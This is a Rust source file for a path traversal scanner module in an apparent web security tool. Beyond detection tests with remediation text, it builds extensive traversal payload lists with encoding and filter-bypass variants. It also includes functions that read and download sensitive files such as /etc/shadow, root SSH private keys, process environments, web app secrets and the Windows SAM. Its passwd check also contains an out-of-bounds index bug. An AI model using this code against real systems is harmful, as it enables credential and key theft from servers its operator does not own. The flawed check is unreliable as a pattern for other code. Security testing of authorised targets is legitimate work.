use crate::http::client::HttpClient;
use crate::http::request::HttpRequest;
use crate::detection::analyzer::{Finding, Severity};
use crate::utils::url::UrlUtil;
use anyhow::Result;
use serde::{Deserialize, Serialize};

/// Path Traversal vulnerability scanner
pub struct PathTraversalScanner {
    client: HttpClient,
    findings: Vec<Finding>,
    target: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileContent {
    pub file_path: String,
    pub content: String,
    pub size: usize,
    pub success: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DirectoryListing {
    pub path: String,
    pub entries: Vec<DirectoryEntry>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DirectoryEntry {
    pub name: String,
    pub entry_type: String,
    pub size: Option<usize>,
    pub permissions: Option<String>,
}

impl PathTraversalScanner {
    pub fn new(target: String, timeout_secs: u64, insecure: bool) -> Result<Self> {
        let client = HttpClient::new(timeout_secs, insecure)?;
        Ok(Self { client, findings: Vec::new(), target })
    }

    /// Attempt to read a remote file via path traversal.
    /// Tries every generated payload and returns the first confirmed file read.
    pub async fn read_file(
        &self, url: &str, param: &str, file_path: &str,
    ) -> Result<FileContent, Box<dyn std::error::Error + Send + Sync>> {
        // Baseline to avoid false positives
        let baseline = self.make_request(url, param, "baseline_oxide_test").await
            .map(|r| r.body).unwrap_or_default();

        for payload in self.generate_file_payloads(file_path) {
            if let Ok(resp) = self.make_request(url, param, &payload).await {
                if resp.body == baseline { continue; }
                if let Some(content) = self.extract_file_content(&resp.body) {
                    let size = content.len();
                    return Ok(FileContent { file_path: file_path.to_string(), content, size, success: true });
                }
            }
        }
        Ok(FileContent { file_path: file_path.to_string(), content: String::new(), size: 0, success: false })
    }

    /// Parse a directory listing that was returned in the response body.
    /// NOTE: this only works if the target is already vulnerable to path traversal
    /// AND the server returns a raw directory listing (e.g. Apache autoindex).
    /// It does NOT send shell commands as URL parameters.
    pub async fn list_directory(
        &self, url: &str, param: &str, dir_path: &str,
    ) -> Result<DirectoryListing, Box<dyn std::error::Error + Send + Sync>> {
        // Try to read the directory itself via traversal — some servers return
        // an HTML directory listing when a directory path is included.
        let payloads = self.generate_file_payloads(dir_path);
        for payload in payloads {
            if let Ok(resp) = self.make_request(url, param, &payload).await {
                if let Some(entries) = self.parse_directory_listing(&resp.body) {
                    return Ok(DirectoryListing { path: dir_path.to_string(), entries });
                }
            }
        }
        Ok(DirectoryListing { path: dir_path.to_string(), entries: Vec::new() })
    }

    // ── Payload generation ────────────────────────────────────────────────────

    /// Generate a comprehensive set of path traversal payloads for a given file path.
    /// All payloads are proper path traversal sequences — no shell commands.
    fn generate_file_payloads(&self, file_path: &str) -> Vec<String> {
        // Strip leading slash for relative variants
        let rel = file_path.trim_start_matches('/');
        let mut payloads = Vec::new();

        // ── Unix relative traversal ──────────────────────────────────────────
        for depth in 3..=8 {
            let prefix = "../".repeat(depth);
            payloads.push(format!("{}{}", prefix, rel));
        }

        // ── Windows backslash variants ───────────────────────────────────────
        for depth in 3..=6 {
            let prefix = "..\\".repeat(depth);
            payloads.push(format!("{}{}", prefix, rel.replace('/', "\\")));
        }

        // ── URL-encoded dot-slash ────────────────────────────────────────────
        payloads.push(format!("..%2f..%2f..%2f{}", rel));
        payloads.push(format!("..%2f..%2f..%2f..%2f{}", rel));
        payloads.push(format!("..%2f..%2f..%2f..%2f..%2f{}", rel));

        // ── Double URL-encoded ───────────────────────────────────────────────
        payloads.push(format!("..%252f..%252f..%252f{}", rel));
        payloads.push(format!("..%252f..%252f..%252f..%252f{}", rel));

        // ── Unicode / overlong UTF-8 ─────────────────────────────────────────
        // %c0%af = overlong encoding of '/' (affects old JVMs / IIS)
        payloads.push(format!("..%c0%af..%c0%af..%c0%af{}", rel));
        // %c1%9c = overlong encoding of '\' 
        payloads.push(format!("..%c1%9c..%c1%9c..%c1%9c{}", rel.replace('/', "%c0%af")));

        // ── Mixed encoding ───────────────────────────────────────────────────
        payloads.push(format!("..%2e%2e%2f..%2e%2e%2f..%2e%2e%2f{}", rel));
        payloads.push(format!("%2e%2e%2f%2e%2e%2f%2e%2e%2f{}", rel));
        payloads.push(format!("%252e%252e%252f%252e%252e%252f%252e%252e%252f{}", rel));

        // ── Dot-dot with null byte (PHP < 5.3.4) ────────────────────────────
        payloads.push(format!("../../../{}%00", rel));
        payloads.push(format!("../../../{}%00.jpg", rel));
        payloads.push(format!("../../../{}%00.php", rel));

        // ── Absolute path (when no prefix stripping) ─────────────────────────
        payloads.push(file_path.to_string());

        // ── file:// URI scheme ───────────────────────────────────────────────
        payloads.push(format!("file://{}", file_path));
        payloads.push(format!("file://localhost{}", file_path));

        // ── PHP wrappers (LFI context) ───────────────────────────────────────
        payloads.push(format!("php://filter/read=convert.base64-encode/resource={}", file_path));
        payloads.push(format!("php://filter/convert.base64-encode/resource={}", file_path));

        // ── IIS-specific: backslash in URL ───────────────────────────────────
        payloads.push(format!("..\\..\\..\\{}", rel.replace('/', "\\")));
        payloads.push(format!("..%5c..%5c..%5c{}", rel.replace('/', "%5c")));

        // ── UNC path (Windows SMB) ───────────────────────────────────────────
        payloads.push(format!("\\\\127.0.0.1\\c$\\{}", rel.replace('/', "\\")));

        // ── Dot-dot with extra dots (filter bypass) ──────────────────────────
        payloads.push(format!("....//....//....//{}",  rel));
        payloads.push(format!("..../....//..../{}",    rel));

        payloads
    }

    // ── Detection ─────────────────────────────────────────────────────────────

    /// Strict multi-indicator check — requires structural evidence of a real file,
    /// not just a single keyword that could appear in normal web content.
    fn contains_path_traversal_indicators(&self, response_text: &str) -> bool {
        let lr = response_text.to_lowercase();

        // /etc/passwd — require colon-separated fields with numeric UID/GID
        if lr.contains("root:") || lr.contains(":x:") {
            for line in lr.lines() {
                let parts: Vec<&str> = line.split(':').collect();
                if parts.len() >= 6
                    && parts[2].trim().parse::<u32>().is_ok()
                    && parts[3].trim().parse::<u32>().is_ok()
                    && (parts[6].contains("/bin/") || parts[6].contains("/sbin/") || parts[6].contains("nologin"))
                {
                    return true;
                }
            }
        }

        // /proc/version — kernel build string
        if lr.contains("linux version") && lr.contains("gcc") && lr.contains("#") {
            return true;
        }

        // /proc/self/environ — null-separated KEY=VALUE pairs
        if lr.contains("path=") && lr.contains("home=") && lr.contains("user=") {
            return true;
        }

        // Windows win.ini — must have all three section markers
        if lr.contains("[extensions]")
            && lr.contains("for 16-bit app support")
            && lr.contains("[mci extensions]")
        {
            return true;
        }

        // /etc/hosts — multiple IP→hostname mappings
        {
            let ip_lines = lr.lines().filter(|l| {
                let t = l.trim();
                (t.starts_with("127.") || t.starts_with("::1") || t.starts_with("0.0.0.0"))
                    && t.split_whitespace().count() >= 2
            }).count();
            if ip_lines >= 2 { return true; }
        }

        // SSH private key
        if lr.contains("-----begin") && (lr.contains("rsa private key") || lr.contains("openssh private key") || lr.contains("ec private key")) {
            return true;
        }

        // PHP wrapper base64 output — base64-encoded /etc/passwd starts with "cm9vd"
        if lr.contains("cm9vd") || lr.contains("cm9vddo") {
            return true;
        }

        // /etc/shadow — hashed password field (starts with $1$, $2$, $5$, $6$, $y$)
        if lr.contains(":$1$") || lr.contains(":$2$") || lr.contains(":$5$") || lr.contains(":$6$") || lr.contains(":$y$") {
            return true;
        }

        false
    }

    /// Extract file content from a response body, stripping HTML scaffolding.
    fn extract_file_content(&self, response_text: &str) -> Option<String> {
        // If the response contains LFI indicators, return the relevant lines
        if !self.contains_path_traversal_indicators(response_text) {
            return None;
        }

        let lines: Vec<&str> = response_text.lines()
            .map(|l| l.trim())
            .filter(|l| {
                !l.is_empty()
                    && !l.starts_with('<')
                    && !l.contains("DOCTYPE")
                    && !l.to_lowercase().contains("<html")
                    && !l.to_lowercase().contains("<body")
                    && !l.to_lowercase().contains("<div")
                    && !l.to_lowercase().contains("<script")
            })
            .collect();

        if lines.is_empty() { None } else { Some(lines.join("\n")) }
    }

    /// Parse an Apache/nginx autoindex HTML directory listing.
    fn parse_directory_listing(&self, response_text: &str) -> Option<Vec<DirectoryEntry>> {
        let mut entries = Vec::new();
        let lr = response_text.to_lowercase();

        // Only proceed if this looks like a directory listing
        if !lr.contains("index of") && !lr.contains("directory listing") {
            return None;
        }

        // Parse ls -la style output (may appear in error pages or CGI output)
        for line in response_text.lines() {
            let trimmed = line.trim();
            if trimmed.starts_with('-') || trimmed.starts_with('d') || trimmed.starts_with('l') {
                let parts: Vec<&str> = trimmed.split_whitespace().collect();
                if parts.len() >= 9 {
                    let name = parts[8..].join(" ");
                    let entry_type = if trimmed.starts_with('d') { "directory" } else { "file" };
                    let size = parts.get(4).and_then(|s| s.parse::<usize>().ok());
                    let permissions = Some(parts[0].to_string());
                    entries.push(DirectoryEntry { name, entry_type: entry_type.to_string(), size, permissions });
                }
            }
        }

        if entries.is_empty() { None } else { Some(entries) }
    }

    // ── Public scan API ───────────────────────────────────────────────────────

    /// Read a curated list of high-value sensitive files.
    pub async fn read_sensitive_files(
        &self, url: &str, param: &str,
    ) -> Result<Vec<FileContent>, Box<dyn std::error::Error + Send + Sync>> {
        let targets = [
            // Linux
            "/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/hostname",
            "/etc/issue", "/etc/motd", "/etc/resolv.conf",
            "/etc/ssh/sshd_config", "/etc/ssh/ssh_host_rsa_key",
            "/etc/apache2/apache2.conf", "/etc/nginx/nginx.conf",
            "/etc/mysql/my.cnf", "/etc/php/php.ini",
            "/var/log/apache2/access.log", "/var/log/nginx/access.log",
            "/var/log/auth.log", "/var/log/syslog",
            "/proc/version", "/proc/self/environ", "/proc/self/cmdline",
            "/proc/mounts", "/proc/net/tcp", "/proc/net/udp",
            "/root/.bash_history", "/root/.ssh/id_rsa", "/root/.ssh/authorized_keys",
            // Web app configs
            "/var/www/html/.env", "/var/www/html/config.php",
            "/var/www/html/wp-config.php", "/var/www/html/configuration.php",
            // Windows
            "C:/windows/win.ini", "C:/windows/system32/drivers/etc/hosts",
            "C:/windows/system32/config/sam",
            "C:/inetpub/wwwroot/web.config",
        ];

        let mut results = Vec::new();
        for path in &targets {
            if let Ok(fc) = self.read_file(url, param, path).await {
                if fc.success { results.push(fc); }
            }
        }
        Ok(results)
    }

    /// Download a remote file to a local path.
    pub async fn download_file(
        &self, url: &str, param: &str, file_path: &str, output_path: &str,
    ) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
        match self.read_file(url, param, file_path).await {
            Ok(fc) if fc.success => {
                std::fs::write(output_path, &fc.content)?;
                println!("[+] {} → {}", file_path, output_path);
            }
            _ => println!("[!] Failed to read: {}", file_path),
        }
        Ok(())
    }

    pub async fn scan_url(&mut self, url: &str, params: &[String]) -> Result<Vec<Finding>> {
        println!("[*] Path traversal scan: {} (target: {})", url, self.target);
        let mut findings = Vec::new();
        for param in params {
            if let Some(f) = self.test_param_for_path_traversal(url, param).await {
                findings.push(f.clone());
                self.findings.push(f);
            }
        }
        Ok(findings)
    }

    pub async fn comprehensive_scan(&mut self, url: &str, params: &[String]) -> Result<Vec<Finding>> {
        println!("[*] Comprehensive path traversal scan: {}", url);
        let mut findings = Vec::new();
        for param in params {
            if let Some(f) = self.test_unix_path_traversal(url, param).await { findings.push(f); }
            if let Some(f) = self.test_windows_path_traversal(url, param).await { findings.push(f); }
            if let Some(f) = self.test_null_byte_injection(url, param).await { findings.push(f); }
            if let Some(f) = self.test_encoded_path_traversal(url, param).await { findings.push(f); }
            if let Some(f) = self.test_double_encoded_path_traversal(url, param).await { findings.push(f); }
        }
        Ok(findings)
    }

    // ── Individual technique tests ────────────────────────────────────────────

    async fn test_param_for_path_traversal(&self, url: &str, param: &str) -> Option<Finding> {
        let baseline = self.make_request(url, param, "baseline_oxide_test")
            .await.map(|r| r.body).unwrap_or_default();

        let payloads = [
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "file:///etc/passwd",
            "php://filter/read=convert.base64-encode/resource=../../../etc/passwd",
        ];

        for payload in &payloads {
            if let Ok(resp) = self.make_request(url, param, payload).await {
                if resp.body != baseline && self.contains_path_traversal_indicators(&resp.body) {
                    return Some(Finding::new(url, Severity::High,
                        &format!("Path Traversal in parameter '{}'", param),
                        &format!("Parameter '{}' is vulnerable to path traversal", param))
                        .with_evidence(&format!("Payload: {}", payload))
                        .with_remediation("Use allow-lists for file paths. Never pass user input to file system APIs."));
                }
            }
        }
        None
    }

    async fn test_unix_path_traversal(&self, url: &str, param: &str) -> Option<Finding> {
        let baseline = self.make_request(url, param, "baseline_oxide_test")
            .await.map(|r| r.body).unwrap_or_default();

        let payloads = [
            "../../../../../../../etc/passwd",
            "../../../../../../../etc/shadow",
            "../../../../../../../etc/hosts",
            "../../../../../../../proc/version",
            "../../../../../../../proc/self/environ",
            "php://filter/read=convert.base64-encode/resource=/etc/passwd",
        ];

        for payload in &payloads {
            if let Ok(resp) = self.make_request(url, param, payload).await {
                if resp.body != baseline && self.contains_path_traversal_indicators(&resp.body) {
                    return Some(Finding::new(url, Severity::High,
                        &format!("Unix Path Traversal in parameter '{}'", param),
                        &format!("Parameter '{}' is vulnerable to Unix path traversal", param))
                        .with_evidence(&format!("Payload: {}", payload))
                        .with_remediation("Restrict file access to a chroot/allowed directory. Validate and canonicalize paths."));
                }
            }
        }
        None
    }

    async fn test_windows_path_traversal(&self, url: &str, param: &str) -> Option<Finding> {
        let baseline = self.make_request(url, param, "baseline_oxide_test")
            .await.map(|r| r.body).unwrap_or_default();

        let payloads = [
            "..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "../../../windows/win.ini",
            "../../../windows/system32/drivers/etc/hosts",
            "..%5c..%5c..%5cwindows%5cwin.ini",
        ];

        for payload in &payloads {
            if let Ok(resp) = self.make_request(url, param, payload).await {
                if resp.body != baseline && self.contains_path_traversal_indicators(&resp.body) {
                    return Some(Finding::new(url, Severity::High,
                        &format!("Windows Path Traversal in parameter '{}'", param),
                        &format!("Parameter '{}' is vulnerable to Windows path traversal", param))
                        .with_evidence(&format!("Payload: {}", payload))
                        .with_remediation("Restrict file access to allowed directories. Canonicalize paths before use."));
                }
            }
        }
        None
    }

    /// Encoded path traversal — uses the Encoder from the payload module.
    /// Detection requires the SAME strict structural indicators, not loose keywords.
    async fn test_encoded_path_traversal(&self, url: &str, param: &str) -> Option<Finding> {
        use crate::payload::encoder::Encoder;
        let baseline = self.make_request(url, param, "baseline_oxide_test")
            .await.map(|r| r.body).unwrap_or_default();

        let base = "../../../etc/passwd";
        let variants = [
            Encoder::url_encode(base),
            Encoder::double_encode(base),
            // Hex-encode only the traversal sequences, not the whole path
            format!("..%2f..%2f..%2fetc%2fpasswd"),
            format!("..%252f..%252f..%252fetc%252fpasswd"),
        ];

        for encoded in &variants {
            if let Ok(resp) = self.make_request(url, param, encoded).await {
                if resp.body != baseline && self.contains_path_traversal_indicators(&resp.body) {
                    return Some(Finding::new(url, Severity::High,
                        &format!("Encoded Path Traversal in parameter '{}'", param),
                        &format!("Parameter '{}' is vulnerable to encoded path traversal", param))
                        .with_evidence(&format!("Encoded payload: {}", encoded))
                        .with_remediation("Decode and canonicalize input before validation. Reject encoded traversal sequences."));
                }
            }
        }
        None
    }

    async fn test_null_byte_injection(&self, url: &str, param: &str) -> Option<Finding> {
        let baseline = self.make_request(url, param, "baseline_oxide_test")
            .await.map(|r| r.body).unwrap_or_default();

        let payloads = [
            "../../../etc/passwd%00",
            "../../../etc/passwd%00.jpg",
            "../../../etc/passwd%00.php",
            "../../../windows/win.ini%00",
            "../../../windows/win.ini%00.txt",
        ];

        for payload in &payloads {
            if let Ok(resp) = self.make_request(url, param, payload).await {
                if resp.body != baseline && self.contains_path_traversal_indicators(&resp.body) {
                    return Some(Finding::new(url, Severity::High,
                        &format!("Null Byte Path Traversal in parameter '{}'", param),
                        &format!("Parameter '{}' is vulnerable to null byte path traversal (PHP < 5.3.4 or C extension)", param))
                        .with_evidence(&format!("Payload: {}", payload))
                        .with_remediation("Upgrade PHP. Strip null bytes from input. Use realpath() and validate against allowed base directory."));
                }
            }
        }
        None
    }

    pub async fn test_double_encoded_path_traversal(&self, url: &str, param: &str) -> Option<Finding> {
        use crate::payload::encoder::Encoder;
        let baseline = self.make_request(url, param, "baseline_oxide_test")
            .await.map(|r| r.body).unwrap_or_default();

        let payloads = [
            Encoder::double_encode("../../../etc/passwd"),
            Encoder::double_encode("..\\..\\..\\windows\\win.ini"),
        ];

        for payload in &payloads {
            if let Ok(resp) = self.make_request(url, param, payload).await {
                if resp.body != baseline && self.contains_path_traversal_indicators(&resp.body) {
                    return Some(Finding::new(url, Severity::High,
                        &format!("Double-Encoded Path Traversal in parameter '{}'", param),
                        &format!("Parameter '{}' is vulnerable to double-encoded path traversal", param))
                        .with_evidence(&format!("Double-encoded payload: {}", payload))
                        .with_remediation("Apply URL decoding iteratively until stable before validation."));
                }
            }
        }
        None
    }

    // ── HTTP helper ───────────────────────────────────────────────────────────

    async fn make_request(&self, url: &str, param: &str, value: &str) -> Result<crate::http::response::HttpResponse> {
        let request_url = UrlUtil::inject_param(url, param, value);
        self.client.send(HttpRequest::get(&request_url)).await
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_passwd_indicator_strict() {
        let scanner = PathTraversalScanner {
            client: HttpClient::new(5, true).unwrap(),
            findings: Vec::new(),
            target: "https://example.com".to_string(),
        };
        // Real passwd line — should trigger
        assert!(scanner.contains_path_traversal_indicators(
            "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin"
        ));
        // Normal web page mentioning "root" — should NOT trigger
        assert!(!scanner.contains_path_traversal_indicators(
            "<html><body>Welcome to the root page</body></html>"
        ));
    }

    #[tokio::test]
    async fn test_scanner_creation() {
        let scanner = PathTraversalScanner::new("https://example.com".to_string(), 30, true).unwrap();
        assert_eq!(scanner.target, "https://example.com");
    }
}
